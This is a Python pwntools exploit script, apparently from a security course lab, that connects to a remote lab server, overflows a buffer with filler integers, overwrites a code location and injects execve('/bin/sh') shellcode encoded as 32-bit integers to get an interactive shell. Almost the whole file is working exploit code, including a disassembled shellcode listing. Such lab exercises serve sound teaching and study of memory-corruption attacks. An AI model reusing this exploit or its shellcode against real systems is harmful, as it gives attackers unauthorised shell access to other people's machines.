from pwn import *

context.arch="x86_64"

""" CONSTANTS """
# Set opcode location
OP_LOC = 4199382  # Location as a decimal 0x4013d6 = 4199382
BUFFER_SIZE = 8 # Set buffer size
BLANK = b"0"  # Convert to bytes
EXIT = b"-1 "  # Convert to bytes


""" EXPLOIT DESTINATION """
p = remote("csc748.hostbin.org", 7023)      # Test Script Against Server
#p = process("./2-3_lab.bin")  # Uncomment to Test Script Locally
#p = gdb.debug("./2-3_lab.bin")

""" DEFINE VARIABLES """
# Define input values
buff_filler = [2863311530, 3149642683]


#Define shellcode

##################
# shell
###################
# disassembled:
#        50                      push %rax
#        48 31 d2              xor %rdx,%rdx
#        48 bb 2f 62 69 6e 2f 2f 73 68       movabs $0x68732f2f6e69622f,%rbx
#        53                      push %rbx
#        54                      push %rsp
#        5f                       pop %rdi
#        b0 3b                  mov $0x3b,%al
#        0f 05                   syscall
#
# register:
#        0x622fbb48 d2314850	 0x5453687 32f2f6e69
#        0x00000005 0f3bb05f	 0x0000000 000000000
################################################

'''
#"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

shell = [
    3526445136,      # 0xd2314850	 
    1647295304,      # 0x622fbb48
    791637609,        # 0x2f2f6e69
    1414752371,      # 0x54536873
    255570015,        # 0x0f3bb05f
    5,                      # 0x00000005
    0,                      # 0x00000000
    0,                       # 0x00000000
    0,
    10,
]
'''
#SHELLCODE = asm(shellcraft.amd64.linux.sh())
#use other python script to convert to below
shell = [
	3091753066,       # 0xb848686a
	1852400175,       # 0x6e69622f
	1932472111,       # 0x732f2f2f
	3884533840,       # 0xe7894850
	23687784,       # 0x01697268
	607420673,       # 0x24348101
	16843009,       # 0x01010101
	1784084017,       # 0x6a56f631
	21519880,       # 0x01485e08
	2303219430,       # 0x894856e6
	1792160230,       # 0x6ad231e6
	84891707      # 0x050f583b
]
    

"""SEND EXPLOIT """
# format : (<buffer fill>*136 + <opcode> + <shellcode> + b"\n")

# send buffer fill
for x in range(BUFFER_SIZE - 1):
    for each in buff_filler:
        p.sendline(str(each).encode())  # Send the input value twice

# send opcode
p.sendline(str(OP_LOC).encode())  # Send the opcode location as bytes
p.sendline(BLANK)  

# send shellcode
for value in shell:
        p.sendline(str(value).encode())
   
p.sendline(EXIT)  # Send exit code

p.interactive()
